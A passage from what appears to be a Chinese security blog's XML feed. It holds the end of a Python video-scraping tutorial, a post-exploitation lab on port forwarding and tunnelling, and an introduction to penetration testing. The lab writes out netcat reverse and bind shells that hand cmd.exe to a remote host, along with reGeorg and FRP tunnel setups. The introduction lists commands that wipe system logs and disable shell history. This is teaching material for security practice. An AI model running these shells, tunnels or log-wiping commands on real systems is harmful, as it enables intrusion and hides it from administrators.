fO_0R3jsJKRy66jK4JKjHKet6vP; ispeed_lsm=0; H_PS_PSSID=1421_24558_21120_17001_24880_22072; BD_UPN=123253; H_PS_645EC=44be6I1wqYYVvyugm2gc3PK9PoSa26pxhzOVbeQrn2rRadHvKoI%2BCbN5K%2Bg; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598','Host':'www.baidu.com','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}# response=requests.get('https://www.baidu.com/s?'+urlencode({'wd':'美女'}),headers=headers)response=requests.get('https://www.baidu.com/s',params={'wd':'美女'},headers=headers) #params内部就是调用urlencodeprint(response.text)</code></pre><h3 id="五：Response"><a href="#五：Response" class="headerlink" title="五：Response"></a>五：Response</h3><ul><li><p>响应状态</p><pre><code>200：代表成功301：代表跳转404：文件不存在403：权限502：服务器错误</code></pre></li><li><p>Respone header</p><pre><code>set-cookie：可能有多个，是来告诉浏览器，把cookie保存下来</code></pre></li><li><p>preview就是网页源代码</p><pre><code>最主要的部分，包含了请求资源的内容如网页html，图片二进制数据等</code></pre></li></ul><h3 id="六：实战"><a href="#六：实战" class="headerlink" title="六：实战"></a>六：实战</h3><ul><li><p>总结爬虫流程：</p><pre><code>爬取---&gt;解析---&gt;存储</code></pre></li><li><p>爬虫所需工具：</p><pre><code>请求库：requests,selenium解析库：正则，beautifulsoup，pyquery存储库：文件，MySQL，Mongodb，Redis</code></pre></li><li><p>爬虫常用框架：</p><pre><code>scrapy</code></pre></li></ul><h4 id="爬取校花网视频"><a href="#爬取校花网视频" class="headerlink" title="爬取校花网视频"></a>爬取校花网视频</h4><ol><li><p>基础版</p><blockquote><p>import re<br>import requests</p><p>respose=requests.get(‘<a href="http://www.xiaohuar.com/v/'">http://www.xiaohuar.com/v/'</a>)<br>print(respose.status_code)# 响应的状态码<br>print(respose.content)  #返回字节信息<br>print(respose.text)  #返回文本内容<br>urls=re.findall(r’class=”items”.<em>?href=”(.</em>?)”‘,respose.text,re.S)  #re.S 把文本信息转换成1行匹配<br>url=urls[5]<br>result=requests.get(url)<br>mp4_url=re.findall(r’id=”media”.<em>?src=”(.</em>?)”‘,result.text,re.S)[0]</p><p>video=requests.get(mp4_url)</p><p>with open(‘D:\a.mp4’,’wb’) as f:</p><pre><code>f.write(video.content)</code></pre></blockquote></li><li><p>函数封装版</p><pre><code class="python">import reimport requestsimport hashlibimport timedef get_index(url):    respose = requests.get(url)    if respose.status_code==200:        return respose.textdef parse_index(res):    urls = re.findall(r'class="items".*?href="(.*?)"', res,re.S)  # re.S 把文本信息转换成1行匹配    return urls</code></pre></li></ol><p>   def get_detail(urls):<br>       for url in urls:<br>           if not url.startswith(‘http’):<br>               url=’<a href="http://www.xiaohuar.com%s'">http://www.xiaohuar.com%s'</a> %url<br>           result = requests.get(url)<br>           if result.status_code==200 :<br>               mp4_url_list = re.findall(r’id=”media”.<em>?src=”(.</em>?)”‘, result.text, re.S)<br>               if mp4_url_list:<br>                   mp4_url=mp4_url_list[0]<br>                   print(mp4_url)<br>                   # save(mp4_url)</p><p>   def save(url):<br>       video = requests.get(url)<br>       if video.status_code==200:<br>           m=hashlib.md5()<br>           m.updata(url.encode(‘utf-8’))<br>           m.updata(str(time.time()).encode(‘utf-8’))<br>           filename=r’%s.mp4’% m.hexdigest()<br>           filepath=r’D:\%s’%filename<br>           with open(filepath, ‘wb’) as f:<br>               f.write(video.content)</p><p>   def main():<br>       for i in range(5):<br>           res1 = get_index(‘<a href="http://www.xiaohuar.com/list-3-%s.html'%">http://www.xiaohuar.com/list-3-%s.html'%</a> i )<br>           res2 = parse_index(res1)<br>           get_detail(res2)</p><p>   if <strong>name</strong> == ‘<strong>main</strong>‘:<br>       main()</p><pre><code>3. 并发版（PS：如果一共需要爬30个视频，开30个线程去做，花的时间就是 其中最慢那份的耗时时间）```pythonimport reimport requestsimport hashlibimport timefrom concurrent.futures import ThreadPoolExecutorp=ThreadPoolExecutor(30) #创建1个程池中，容纳线程个数为30个；def get_index(url):    respose = requests.get(url)    if respose.status_code==200:        return respose.textdef parse_index(res):    res=res.result() #进程执行完毕后，得到1个对象    urls = re.findall(r'class="items".*?href="(.*?)"', res,re.S)  # re.S 把文本信息转换成1行匹配    for url in urls:        p.submit(get_detail(url))  #获取详情页 提交到线程池def get_detail(url):  #只下载1个视频        if not url.startswith('http'):            url='http://www.xiaohuar.com%s' %url        result = requests.get(url)        if result.status_code==200 :            mp4_url_list = re.findall(r'id="media".*?src="(.*?)"', result.text, re.S)            if mp4_url_list:                mp4_url=mp4_url_list[0]                print(mp4_url)                # save(mp4_url)def save(url):    video = requests.get(url)    if video.status_code==200:        m=hashlib.md5()        m.updata(url.encode('utf-8'))        m.updata(str(time.time()).encode('utf-8'))        filename=r'%s.mp4'% m.hexdigest()        filepath=r'D:\\%s'%filename        with open(filepath, 'wb') as f:            f.write(video.content)def main():    for i in range(5):        p.submit(get_index,'http://www.xiaohuar.com/list-3-%s.html'% i ).add_done_callback(parse_index)        #1、先把爬主页的任务（get_index）异步提交到线程池        #2、get_index任务执行完后，会通过回调函add_done_callback（）数通知主线程，任务完成；        #2、把get_index执行结果（注意线程执行结果是对象，调用res=res.result()方法，才能获取真正执行结果），当做参数传给parse_index        #3、parse_index任务执行完毕后，        #4、通过循环，再次把获取详情页 get_detail（）任务提交到线程池执行if __name__ == '__main__':    main()</code></pre><h5 id="涉及知识："><a href="#涉及知识：" class="headerlink" title="涉及知识："></a>涉及知识：</h5><blockquote><p>计算密集型任务：使用多进程，因为能Python有GIL，多进程可以利用上CPU多核优势；</p><p>IO密集型任务：使用多线程，做IO切换节省任务执行时间（并发）</p><p>线程池</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>端口转发与隧道</title>
      <link href="2021/01/21/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/"/>
      <url>2021/01/21/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/</url>
      
        <content type="html"><![CDATA[<h3 id="实验1：LCX端口转发"><a href="#实验1：LCX端口转发" class="headerlink" title="实验1：LCX端口转发"></a>实验1：LCX端口转发</h3><ul><li>正向转发</li></ul><blockquote><p>内网主机执行：lcx.exe –slave 公网主机IP 公网主机端口 内网主机IP 内网主机端口</p></blockquote><blockquote><p>外网主机执行：Lcx.exe –listen 公网主机端口1 公网主机端口2</p></blockquote><ul><li>反向转发</li></ul><blockquote><p>外网主机执行：Lcx.exe -tran 53 目标主机IP 3389</p></blockquote><h3 id="试验二：PORTMAP端口转发"><a href="#试验二：PORTMAP端口转发" class="headerlink" title="试验二：PORTMAP端口转发"></a>试验二：PORTMAP端口转发</h3><ul><li>正向转发</li></ul><blockquote><p>内网主机执行：./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网主机ip -p2 6666</p><p>外网主机执行：./portmap -m 2 -p1 6666 -h2 公网主机ip -p2 7777</p></blockquote><ul><li>反向转发</li></ul><blockquote><p>外网主机执行：./portmap -m1 -p1 6666 -h2 目标主机IP -p2 22</p></blockquote><h3 id="实验三：NC反弹"><a href="#实验三：NC反弹" class="headerlink" title="实验三：NC反弹"></a>实验三：NC反弹</h3><ul><li>反向连接</li></ul><blockquote><p>在公网主机进行监听：nc -lvp 4444</p><p>在内网主机执行：nc -t -e cmd.exe 公网主机IP 4444</p></blockquote><ul><li>正向连接</li></ul><blockquote><p>远程主机执行：nc -l -p 4444 -t -e cmd.exe</p><p>攻击主机执行：nc -vv 远程主机IP 4444</p></blockquote><h3 id="实验四：EW工具使用"><a href="#实验四：EW工具使用" class="headerlink" title="实验四：EW工具使用"></a>实验四：EW工具使用</h3><ul><li><p>端口转发</p></li><li><ul><li><p>反向转发</p><blockquote><p>./ew_for_Linux64 -s lcx_tran -l 1080 -f 内网主机IP -g 3389</p></blockquote></li><li><p>正向转发</p><blockquote><p>公网执行：ew -s lcx_listen -l 1080 -e 8080<br>内网执行：ew -s lcx_slave -d 192.168.0.31 -e 8080 -f 192.168.5.101 -g 22</p></blockquote></li></ul></li><li><p>流量转发</p></li><li><ul><li><p>正向代理</p><blockquote><p>ew -s ssocksd -l 8888      开启 8888端口的socks 代理</p></blockquote></li><li><p>反向代理</p><blockquote><p>1.在公网服务器上执行以下命令:<br>ew -s rcsocks -l 1080 -e 1024       监听本机的1080端口转发到反连1024端口的主机<br>2在目标机器执行以下命令:<br>ew -s rssocks -d 公网IP -e 1024             通过socks隧道连接公网IP的1024端口</p></blockquote></li></ul></li></ul><h3 id="实验五：reGeorg-Proxychains"><a href="#实验五：reGeorg-Proxychains" class="headerlink" title="实验五：reGeorg+Proxychains"></a>实验五：reGeorg+Proxychains</h3><h4 id="步骤一：服务器操作"><a href="#步骤一：服务器操作" class="headerlink" title="步骤一：服务器操作"></a>步骤一：服务器操作</h4><blockquote><p>yum -y install httpd php</p><p>Tunnel.nosockets.php—&gt;/var/www/html</p></blockquote><h4 id="步骤二：客户端操作"><a href="#步骤二：客户端操作" class="headerlink" title="步骤二：客户端操作"></a>步骤二：客户端操作</h4><blockquote><p><a href="http://81.70.149.131/tunnelnos.php">http://81.70.149.131/tunnelnos.php</a></p><p>回显内容：Georg says, ‘All seems fine’</p></blockquote><blockquote><p>python2 reGeorgSocksProxy.py -p 8080 -u  <a href="http://81.70.149.131/tunnelnos.php">http://81.70.149.131/tunnelnos.php</a></p></blockquote><h4 id="步骤三：Proxychains配置"><a href="#步骤三：Proxychains配置" class="headerlink" title="步骤三：Proxychains配置"></a>步骤三：Proxychains配置</h4><blockquote><p>vi /etc/proxychains4.conf</p><p>52 #proxy_dns</p><p>115 socks5 127.0.0.1 8080</p></blockquote><h4 id="步骤四：验证配置"><a href="#步骤四：验证配置" class="headerlink" title="步骤四：验证配置"></a>步骤四：验证配置</h4><blockquote><p>proxychains curl <a href="http://10.0.8.12/">http://10.0.8.12/</a></p><p>proxychains msfconsole</p></blockquote><h3 id="实验六：FRP内网穿透"><a href="#实验六：FRP内网穿透" class="headerlink" title="实验六：FRP内网穿透"></a>实验六：FRP内网穿透</h3><h4 id="步骤一：公网主机配置"><a href="#步骤一：公网主机配置" class="headerlink" title="步骤一：公网主机配置"></a>步骤一：公网主机配置</h4><blockquote><p>#frps.ini文件内容配置如下</p><p>[common]<br>bind_addr=0.0.0.0<br>bind_port = 7000</p><p>authenticate_heartbeats = true<br>authenticate_new_work_conns = true<br>authentication_method = token<br>token = ‘123456’</p><p>dashboard_port = 7500<br>dashboard_user = admin<br>dashboard_pwd = admin888</p></blockquote><blockquote><p>./frps -c frps.ini          #启动服务端</p><p>http://公网IP:7500/   #登录WEB控制端</p></blockquote><h4 id="步骤二：内网主机配置"><a href="#步骤二：内网主机配置" class="headerlink" title="步骤二：内网主机配置"></a>步骤二：内网主机配置</h4><blockquote><p>#frpc.ini文件内容如下</p><p>[common]<br>server_addr = 1.1.1.1<br>server_port = 7000<br>authenticate_heartbeats = true<br>authenticate_new_work_conns = true<br>authentication_method = token<br>token = ‘123456’</p><p>[rdp]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 3389<br>remote_port = 6000</p></blockquote><blockquote><p>frpc.exe -c frpc.ini   #客户端与服务端建立连接</p></blockquote><h4 id="步骤三：配置验证"><a href="#步骤三：配置验证" class="headerlink" title="步骤三：配置验证"></a>步骤三：配置验证</h4><blockquote><p>mstsc 1.1.1.1:6000   #进行内网主机RDP登录</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试简介</title>
      <link href="2021/01/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B/"/>
      <url>2021/01/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="一：术语介绍"><a href="#一：术语介绍" class="headerlink" title="一：术语介绍"></a>一：术语介绍</h2><blockquote><p>每个行业都有业界名词，EXP都不知道是啥？</p></blockquote><ul><li><p>病毒：是在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组计算机指令或者程序代码；</p></li><li><p>木马：是比较流行的病毒文件，与一般的病毒不同，它不会自我繁殖，也并不“刻意”地去感染其他文件，它通过将自身伪装吸引用户下载执行，向施种木马者提供打开被种主机的门户，使施种者可以任意毁坏、窃取被种者的文件，甚至远程操控被种主机；</p></li><li><p>肉鸡：指电脑中了木马，或者留了后门，可以被远程操控的机器，现在许多人把有WEBSHELL 权限的机器也叫肉鸡；</p></li><li><p>抓鸡：利用使用大量的程序的漏洞，使用自动化方式获取肉鸡的行为；</p></li><li><p>挖矿：是将一段时间内比特币系统中发生的交易进行确认，并记录在区块链上形成新区块的过程；</p></li><li><p>HTTP/HTTPS：定义Web客户端如何从Web服务器请求Web页面,以及服务器如何把Web页面传送给客户端；</p></li><li><p>MD5：一种被广泛使用的密码散列函数,属于不可逆加密；</p></li><li><p>CMS：Content Management System的缩写，内容管理系统；</p></li><li><p>框架：代码框架 比如CMS是已经装修好的房子 框架就是毛坯房；</p></li><li><p>漏洞：硬件、软件、协议等可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等；</p></li><li><p>一句话木马：通过向服务端提交一句简短的代码，配合本地客户端实现Webshell功能的木马；</p></li><li><p>Webshell:通过Web入侵后留下的后门工具，可以据此对网站服务进行一定程度的控制；</p></li><li><p>提权：操作系统低权限的账户将自己提升为管理员权限使用的过程；</p></li><li><p>跳板：使用肉鸡IP来实施攻击其他目标，以便更好的隐藏自己的身份信息；</p></li><li><p>旁站：即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限；</p></li><li><p>C段：即同C段下服务器入侵。如目标IP为192.168.1.1入侵192.168.1.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息；</p></li><li><p>撞库：是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，批量登陆其他网站后，得到可以登录的用户。</p></li><li><p>暴库：通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地。</p></li><li><p>Poc：能证明漏洞存在的代码；</p></li><li><p>Exp：漏洞利用 一般都是demo工具 ；</p></li><li><p>Bug：指系统功能与预期不一致的代码缺陷；</p></li><li><p>Waf：WEB应用防护系统，也称之为网站应用级入侵防御系统；</p></li><li><p>Payload：攻击载荷，被送到目标机器执行的整段代码；</p></li><li><p>0day：未公开的漏洞 仅少数人知道；</p></li><li><p>1day：刚公开的漏洞官方发布了补丁，但是网上还有很多未打补丁的漏洞；</p></li><li><p>Nday：漏洞发布了很久还是没有修复的漏洞；</p></li><li><p>Shellcode：是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。</p></li><li><p>APT：高级可持续性攻击，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的供给形式（极强的隐蔽性、潜伏期长，持续性强、目标性强）</p></li></ul><h3 id="黑客挑战"><a href="#黑客挑战" class="headerlink" title="黑客挑战"></a>黑客挑战</h3><blockquote><p>能否将渗透术语介绍中的名词（CMS）所用的应用做详细的资产列表？</p></blockquote><h2 id="二：渗透测试流程"><a href="#二：渗透测试流程" class="headerlink" title="二：渗透测试流程"></a>二：渗透测试流程</h2><h4 id="什么是渗透测试？"><a href="#什么是渗透测试？" class="headerlink" title="什么是渗透测试？"></a>什么是渗透测试？</h4><blockquote><p>渗透测试就是通过模拟真实黑客的攻击手段来对目标系统进行一些列的评估</p></blockquote><h4 id="什么是等保测评？"><a href="#什么是等保测评？" class="headerlink" title="什么是等保测评？"></a>什么是等保测评？</h4><blockquote><p>全称是信息安全等级保护测评，是经公安部认证的具有资质的测评机构，依据国家信息安全等级保护规范规定，受有关单位委托，按照有关管理规范和技术标准，对信息系统安全等级保护状况进行检测评估的活动。</p><ul><li>安全技术测评：包括物理安全、网络安全、主机系统安全、应用安全和数据安全等五个层面上的安全控制测评。</li><li>安全管理测评：包括安全管理机构、安全管理制度、人员安全管理、系统建设管理和系统运维管理等五个方面的安全控制评。</li></ul></blockquote><h4 id="什么是风险评估？"><a href="#什么是风险评估？" class="headerlink" title="什么是风险评估？"></a>什么是风险评估？</h4><blockquote><p>风险评估是对信息资产（即某事件或事物所具有的信息集）所面临的威胁、存在的弱点、造成的影响，以及三者综合作用所带来风险的可能性的评估。</p></blockquote><h4 id="三者区别"><a href="#三者区别" class="headerlink" title="三者区别"></a>三者区别</h4><table><thead><tr><th align="center">名词</th><th align="left">执行目的</th><th align="left">参照标准</th></tr></thead><tbody><tr><td align="center">渗透测试</td><td align="left">评估网络/系统/应用三者组合使用下的安全状况</td><td align="left">PTES</td></tr><tr><td align="center">风险评估</td><td align="left">以PDCA循环持续推进风险管理为目的</td><td align="left">ISO27001</td></tr><tr><td align="center">等保测评</td><td align="left">是否符合等级保护要求为目的</td><td align="left">GA 388-2002</td></tr></tbody></table><h4 id="渗透测试类型"><a href="#渗透测试类型" class="headerlink" title="渗透测试类型"></a>渗透测试类型</h4><blockquote><ul><li><p>黑盒测试:又称为功能测试，渗透者完全处于对系统一无所知的状态，通常这类型测试，最初的信息获取来自于DNS、Web、Email及各种公开对外的服务器。</p></li><li><p>白盒测试：也称为结构测试，与黑箱测试恰恰相反，测试者可以通过正常渠道向被测单位取得各种资料，包括网络拓扑、员工资料甚至网站或其它程序的代码片段，也能够与单位的其它员工进行面对面的沟通。这类测试的目的是模拟企业内部雇员的越权操作。</p></li><li><p>灰盒测试：是介于白盒测试与黑盒测试之间的一种测试，通常情况下，接受渗透测试的单位网络管理部门会收到通知：在某些时段进行测试。因此能够监测网络中出现的变化。但灰盒测试被测单位也仅有极少数人知晓测试的存在，因此能够有效地检验单位中的信息安全事件监控、响应、恢复做得是否到位。</p></li></ul></blockquote><h4 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h4><blockquote><p>要对一个目标进行渗透测试，首先必须确保安全测试遵循了渗透测试执行标准（Penetration Testing Execution Standard, PTES）如果对渗透测试流程不了解可以在以下网站中学习渗透测试和安全分析的部分内容。</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/20/sWcASO.png"></p><ul><li><a href="http://www.pentest-standard.org/index.php/Main_Page">国外渗透测试执行标准</a></li></ul><h4 id="1：确定目标"><a href="#1：确定目标" class="headerlink" title="1：确定目标"></a>1：确定目标</h4><table><thead><tr><th>渗透目标</th><th>常见应用</th></tr></thead><tbody><tr><td>操作系统</td><td>Linux主机/Windows主机</td></tr><tr><td>数据库系统</td><td>SQL Server/MySQL/Oracle/DB2/PostgreSQL/….</td></tr><tr><td>应用系统</td><td>FTP/DNS/DHCP/WEB/RDP/….</td></tr><tr><td>网络设备</td><td>防火墙/入侵检测系统/交换机/路由器</td></tr></tbody></table><ul><li><p>风险规避</p><blockquote><p>明确渗透测试范围;<br>测试之前对重要数据进行备份;<br>不要进行DDos/CC攻击，不破坏数据;<br>可以对原始系统生成镜像环境，然后对镜像环境进行测试;<br>任何测试执行前必须和客户进行沟通，以免引来不必要的麻烦;</p></blockquote></li></ul><h4 id="2：信息收集"><a href="#2：信息收集" class="headerlink" title="2：信息收集"></a>2：信息收集</h4><table><thead><tr><th>收集信息</th><th>应用场景</th></tr></thead><tbody><tr><td>真实IP地址</td><td>确定网站的真实IP地址，才能挖掘出更多有用的信息</td></tr><tr><td>子域名信息</td><td>如果发现不了网站的管理界面，不妨提前收集好子域名信息</td></tr><tr><td>whois信息</td><td>确定网站是否合法？要爆破管理用户登录？鱼叉式网络钓鱼攻击？</td></tr><tr><td>指纹信息</td><td>操作系统/数据库/CMS管理系统？</td></tr><tr><td>网站敏感文件</td><td>Robots文件/文件上传页面/网站备份文件/管理员登录……</td></tr><tr><td>端口开放信息</td><td>21/22/25/80/443/1433/1521/3306/3389/5000/5432/</td></tr><tr><td>旁站/C段扫描</td><td>一台服务器多台网站？同一网段服务器？</td></tr></tbody></table><ul><li>思考：信息收集对渗透测试的重要程度？</li></ul><h4 id="3：漏洞探测"><a href="#3：漏洞探测" class="headerlink" title="3：漏洞探测"></a>3：漏洞探测</h4><table><thead><tr><th>漏洞名称</th><th>目标获取</th></tr></thead><tbody><tr><td>SQL Injection</td><td>数据库信息..</td></tr><tr><td>Cross site scripting</td><td>Cookie信息…</td></tr><tr><td>Cross site request forgery</td><td>Cookie信息…</td></tr><tr><td>File Include</td><td>脚本木马…</td></tr><tr><td>File Upload</td><td>后门上传…</td></tr><tr><td>Command execution</td><td>系统命令执行…</td></tr><tr><td>Code execution</td><td>脚本代码执行…</td></tr><tr><td>Code Injection</td><td>获取内网信息…</td></tr><tr><td>brute force</td><td>猜解用户密码…</td></tr><tr><td>Struts2</td><td>获取用户权限…</td></tr></tbody></table><h4 id="4：漏洞利用"><a href="#4：漏洞利用" class="headerlink" title="4：漏洞利用"></a>4：漏洞利用</h4><blockquote><p>当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的webshell，我们往往需要结合几个漏洞来拿webshell。常用的漏洞利用工具如下：</p></blockquote><table><thead><tr><th>常见漏洞</th><th>漏洞利用工具</th></tr></thead><tbody><tr><td>SQL注入</td><td>SQLMap …..</td></tr><tr><td>XSS跨站</td><td>XSS-Beef …..</td></tr><tr><td>抓包改包</td><td>BurpSuite，Fiddler，Wireshark，Winsock…..</td></tr><tr><td>加密解密</td><td>Hackbar …..</td></tr><tr><td>暴力破解</td><td>Hydra Medusa…..</td></tr></tbody></table><h4 id="5：权限提升"><a href="#5：权限提升" class="headerlink" title="5：权限提升"></a>5：权限提升</h4><blockquote><p>至此已经拿到了webshell也就是获取网站的管理权限，这一步就已经开始了后渗透测试的篇章<br>顾名思义，权限提升在这里是指将我们的普通用户权限提升到Administrator或者Root权限，常见的提权工具如下：</p></blockquote><ol><li><p>Windows提权</p><blockquote><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a><br><a href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a><br><a href="https://github.com/ianxtianxt/win-exp-">https://github.com/ianxtianxt/win-exp-</a></p></blockquote></li><li><p>Linux提权</p><blockquote><p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p></blockquote></li></ol><h4 id="6：内网渗透"><a href="#6：内网渗透" class="headerlink" title="6：内网渗透"></a>6：内网渗透</h4><blockquote><p>如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发了。我们是不能直接和内网的主机通信的，所以我们就需要借助获取到的webshell网站的服务器和内网主机进行通信。</p></blockquote><table><thead><tr><th>转发方式</th><th>转发工具</th></tr></thead><tbody><tr><td>端口转发</td><td>LCX/PortMap/Nc</td></tr><tr><td>流量转发</td><td>EW/Frp/reGeorg/sSocks/proxychains/</td></tr></tbody></table><ul><li><p>内网渗透</p><p>​    —&gt; 域环境</p><p>​    —&gt;非域环境</p></li></ul><h4 id="7：痕迹清理"><a href="#7：痕迹清理" class="headerlink" title="7：痕迹清理"></a>7：痕迹清理</h4><blockquote><p>完全清理入侵痕迹？主要是增加管理员发现入侵者的时间成本和人力成本。只要管理员想查，无论怎么清除，还是能查到的。其主要目的还是要以隐藏入侵者身份为主，最好的手段是在渗透前挂上代理，然后在渗透后痕迹清除。</p></blockquote><ul><li><p>Windows系统</p><blockquote><p>系统日志文件:del %WINDR% .log /a/s/q/f<br>web日志文件：access.log error.log</p></blockquote></li><li><p>Linux系统</p><blockquote><p>历史命令 export HISTFILE=/dev/null export HISTSIZE=0<br>系统日志文件：rm -rf /var/log/*.log<br>web日志文件:.access_log error_log</p></blockquote></li></ul><p><img src="https://s3.ax1x.com/2021/01/20/sWh3pq.png"></p><ul><li>思考：怎样将入侵痕迹完全清除？</li></ul><h4 id="8：撰写报告"><a href="#8：撰写报告" class="headerlink" title="8：撰写报告"></a>8：撰写报告</h4><blockquote><p>在完成了渗透测试之后，我们就需要对这次渗透测试撰写渗透测试报告了。一个好的渗透测试报告至关重要,首先你需要明确漏洞名称以及漏洞原理。其次要注明参与人员，测试时间，内网外网在报告中具体阐述漏洞是如何产生的，如何利用的。最后应该给出详细的解决方案。</p></blockquote><table><thead><tr><th>包含内容</th><th>解析</th></tr></thead><tbody><tr><td>封面</td><td>测试公司的名称、标志以及客户的名称应该突出显示。</td></tr><tr><td>内容提要</td><td>像短篇小说一样的内容提要，内容要限制在一页纸以内</td></tr><tr><td>漏洞总结</td><td>可以使用花哨的图形（表格或图表），清晰明了漏洞列表</td></tr><tr><td>团队信息</td><td>渗透测试人员名字/联系方式</td></tr><tr><td>工具列表</td><td>渗透测试工具要包括版本和功能的简要描述</td></tr><tr><td>工作范围</td><td>应事先已经同意，可测试的目标范围</td></tr><tr><td>报告主体</td><td>主体:如何发现和利用以及修补漏洞，细节信息</td></tr></tbody></table><h2 id="三：技术及行业发展"><a href="#三：技术及行业发展" class="headerlink" title="三：技术及行业发展"></a>三：技术及行业发展</h2><blockquote><p>有需求才有业务</p></blockquote><h3 id="黑客技术发展趋势"><a href="#黑客技术发展趋势" class="headerlink" title="黑客技术发展趋势"></a>黑客技术发展趋势</h3><p><img src="https://s3.ax1x.com/2021/01/20/sW4r5j.png"></p><ul><li><a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2019">2019年10大黑客技术</a></li></ul><h3 id="技术层面的黑客等级"><a href="#技术层面的黑客等级" class="headerlink" title="技术层面的黑客等级"></a>技术层面的黑客等级</h3><table><thead><tr><th>等级划分</th><th>各级现状</th></tr></thead><tbody><tr><td>Level 1</td><td>愣头青【百万人】:会使用安全工具，只能简单扫描、破译密码</td></tr><tr><td>Level 2</td><td>系统管理员【上万人】:善用安全工具，特别熟悉系统及网络</td></tr><tr><td>Level 3</td><td>大公司开发人员或核心安全公司大牛【几千人】:对操作系统特别熟悉,开发代码</td></tr><tr><td>Level 4</td><td>挖掘并利用漏洞【几百人】:自己能找漏洞并写exp利用漏洞的；对系统挖洞的协议测试</td></tr><tr><td>Level 5</td><td>高水平【少于百人】：防御和构建系统的人</td></tr><tr><td>Level 6</td><td>精英级【几十人到十几人】：对操作系统的理解很深入</td></tr><tr><td>Level 7</td><td>大牛牛【寥寥无几】：马克·扎克伯格、艾伯特·爱因斯坦等改变世界的人</td></tr></tbody></table><h3 id="我认为的黑客等级"><a href="#我认为的黑客等级" class="headerlink" title="我认为的黑客等级"></a>我认为的黑客等级</h3><table><thead><tr><th align="center">月收益</th><th align="center">项目</th></tr></thead><tbody><tr><td align="center">80W–</td><td align="center">DDOS攻击？</td></tr><tr><td align="center">40W-80W</td><td align="center">勒索病毒？挖矿木马？</td></tr><tr><td align="center">20W-40W</td><td align="center">0day挖掘？外挂制作？</td></tr><tr><td align="center">10W-20W</td><td align="center">SRC/博彩/资金盘/股票盘/…非法站</td></tr></tbody></table><ul><li>友情提示：赚钱的项目都写到刑法里了，切勿知法犯法 </li></ul><h3 id="薪资水平"><a href="#薪资水平" class="headerlink" title="薪资水平"></a>薪资水平</h3><ul><li><a href="http://www.gsqi.net/gongzi/26622/">网路安全/月薪收入</a></li></ul><h3 id="行业发展"><a href="#行业发展" class="headerlink" title="行业发展"></a>行业发展</h3><ul><li><a href="https://mp.ofweek.com/security/a056714263077">2020年中国网络安全行业市场规模及发展前景分析</a></li></ul><h2 id="四-《网络安全法》"><a href="#四-《网络安全法》" class="headerlink" title="四:《网络安全法》"></a>四:《网络安全法》</h2><blockquote><p>“没有规矩，不成方圆”</p></blockquote><h4 id="《网络安全法》"><a href="#《网络安全法》" class="headerlink" title="《网络安全法》"></a>《网络安全法》</h4><blockquote><p>2016年11月7日第二十届全国人民代表大会常务委员会第二十四次通过《中华人民共和国网络安全法》，自2017年6月1日施行；</p></blockquote><h4 id="六方面亮点"><a href="#六方面亮点" class="headerlink" title="六方面亮点"></a>六方面亮点</h4><ol><li>明确了网络空间主权的原则。</li><li>明确了网络产品和服务提供者的安全义务。</li><li>明确了网络运营者的安全义务。</li><li>进一步完善了个人信息保护规则。</li><li>建立了关键信息基础设施安全保护制度。</li><li>确立了关键信息机出设施重要数据跨境传输的规则。</li></ol><h4 id="《网络安全法》内容"><a href="#《网络安全法》内容" class="headerlink" title="《网络安全法》内容"></a>《网络安全法》内容</h4><p><img src="https://s3.ax1x.com/2021/01/20/sWTPzR.png"></p><p><img src="https://s3.ax1x.com/2021/01/20/sWTAL6.png"></p><p><img src="https://s3.ax1x.com/2021/01/20/sWTuJH.png"></p><ul><li>《网络安全法》百度云盘分享：链接：<a href="https://pan.baidu.com/s/110b9hYwIoyC0AH_GXksD7g">https://pan.baidu.com/s/110b9hYwIoyC0AH_GXksD7g</a> 提取码：laos </li><li>持续更新中…</li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权之权限维持</title>
      <link href="2021/01/19/Windows%E6%8F%90%E6%9D%83%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>2021/01/19/Windows%E6%8F%90%E6%9D%83%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
